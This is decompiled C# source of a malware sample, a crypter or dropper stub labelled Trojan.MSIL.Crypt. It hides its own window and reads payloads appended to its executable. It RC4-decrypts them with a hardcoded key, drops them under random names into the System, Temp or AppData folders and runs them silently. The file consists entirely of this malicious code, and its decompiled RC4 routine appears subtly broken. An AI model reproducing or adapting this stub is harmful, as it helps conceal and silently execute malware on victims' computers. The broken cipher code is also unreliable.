// Decompiled with JetBrains decompiler
// Type: WindowsApplication2.Form1
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 203F0B26-5FFF-417A-945E-ABA05A8AC089
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.Crypt.bnhq-8a3b7dbb0cfdf31f8285b58bb6e32ebba8908b7f9b69f0e9d3b39a0afcd05c0b.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using WindowsApplication2.My;

namespace WindowsApplication2
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    private const string Splitter = "@#sp@##@s@lit#mixed";
    private const string enckey = "Yod2ff86sd84f8r84bj84d3fgh68sdh6";

    [DebuggerNonUserCode]
    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.ControlBox = false;
      this.Enabled = false;
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.WindowState = FormWindowState.Minimized;
      this.ResumeLayout(false);
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      string Expression = Strings.Space(checked ((int) FileSystem.LOF(1)));
      FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read);
      FileSystem.FileGet(1, ref Expression);
      FileSystem.FileClose(1);
      string[] strArray1 = Strings.Split(Expression, "@#sp@##@s@lit#mixed");
      int num1 = checked ((int) Math.Round(Conversion.Val(Form1.rc4(strArray1[1], "Yod2ff86sd84f8r84bj84d3fgh68sdh6"))));
      string Left = strArray1[2];
      string str1;
      if (Operators.CompareString(Left, Form1.rc4("SYSTEM", "Yod2ff86sd84f8r84bj84d3fgh68sdh6"), false) == 0)
        str1 = Environment.SystemDirectory + "\\";
      else if (Operators.CompareString(Left, Form1.rc4("TEMP", "Yod2ff86sd84f8r84bj84d3fgh68sdh6"), false) == 0)
        str1 = MyProject.Computer.FileSystem.SpecialDirectories.Temp + "\\";
      else if (Operators.CompareString(Left, Form1.rc4("APPDATA", "Yod2ff86sd84f8r84bj84d3fgh68sdh6"), false) == 0)
        str1 = Environment.GetEnvironmentVariable("APPDATA") + "\\";
      int num2 = checked (num1 + 2);
      int FileNumber = 3;
      while (FileNumber <= num2)
      {
        try
        {
          string[] strArray2 = Strings.Split(strArray1[FileNumber], "#EXT#@is@here##");
          string str2 = str1 + this.Number(10000, 99999) + Form1.rc4(strArray2[1], "Yod2ff86sd84f8r84bj84d3fgh68sdh6");
          FileSystem.FileOpen(FileNumber, str2, OpenMode.Binary, OpenAccess.ReadWrite);
          FileSystem.FilePut(FileNumber, Form1.rc4(strArray2[0], "Yod2ff86sd84f8r84bj84d3fgh68sdh6"), -1L, false);
          FileSystem.FileClose(FileNumber);
          Process.Start(str2);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++FileNumber; }
      }
      ProjectData.EndApp();
    }

    public static string rc4(string message, string password)
    {
      int[] numArray1 = new int[257];
      int location1 = 0;
      int[] numArray2 = new int[257];
      while (location1 <= (int) byte.MaxValue)
      {
        int length = password.Length;
        char String = password.Substring(location1 % length, 1).ToCharArray()[0];
        numArray2[location1] = location1;
        numArray1[location1] = Strings.Asc(String);
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      int location2 = 0;
      while (location2 <= (int) byte.MaxValue)
      {
        int index = checked (0 + numArray2[location2] + numArray1[location2]) % 256;
        int num = numArray2[location2];
        numArray2[index] = num;
        numArray2[location2] = numArray2[index];
        Math.Max(Interlocked.Increment(ref location2), checked (location2 - 1));
      }
      int location3 = 1;
      StringBuilder stringBuilder = new StringBuilder();
      while (location3 <= message.Length)
      {
        int index1 = checked (0 + 1) % 256;
        int index2 = checked (0 + numArray2[index1]) % 256;
        int num1 = 0;
        numArray2[index2] = num1;
        int num2 = numArray2[index1];
        numArray2[index1] = numArray2[index2];
        int CharCode = Strings.Asc(message.Substring(checked (location3 - 1), 1).ToCharArray()[0]) ^ numArray2[checked (numArray2[index1] + numArray2[index2]) % 256];
        stringBuilder.Append(Strings.Chr(CharCode));
        Math.Max(Interlocked.Increment(ref location3), checked (location3 - 1));
      }
      string empty = string.Empty;
      string str = stringBuilder.ToString();
      stringBuilder.Length = 0;
      return str;
    }

    private string GetBetween(
      ref string strSource,
      ref string strStart,
      ref string strEnd,
      ref int startPos = 0)
    {
      string between = string.Empty;
      int num1 = strSource.IndexOf(strStart, startPos);
      int length = strStart.Length;
      int num2 = strSource.IndexOf(strEnd, checked (num1 + length));
      if (num1 != -1 && num2 != -1)
        between = strSource.Substring(checked (num1 + length), checked (num2 - num1 + length));
      return between;
    }

    private string Number(int min, int max) => new Random().Next(min, max).ToString();
  }
}
